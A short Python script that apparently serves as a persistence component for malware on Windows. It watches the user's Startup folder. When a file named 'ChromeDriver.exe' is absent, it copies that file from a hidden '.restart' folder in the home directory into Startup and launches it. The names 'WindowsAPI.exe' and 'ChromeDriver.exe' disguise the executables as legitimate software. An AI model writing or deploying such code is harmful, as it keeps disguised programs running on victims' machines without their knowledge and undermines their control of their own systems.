#type B

import os
import shutil
import time

typeb = '\\test137.py'
typeb = '\\WindowsAPI.exe'

typea = '\\test136.py'
typea = '\\ChromeDriver.exe'

desk = os.path.join(os.path.expanduser('~'),'Desktop')
start = os.path.join(os.path.expanduser('~'),'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
drive = os.path.expanduser('~')
setup = os.path.join(os.path.expanduser('~'),'.setup')
restart = os.path.join(os.path.expanduser('~'),'.restart')

temp = True
time.sleep(1)

while temp:
    if not os.path.isfile(start + typea):
        shutil.copy2(restart + typea, start + typea)
        time.sleep(5)
        os.startfile(start + typea)
        time.sleep(1)
        temp = False
    time.sleep(10)
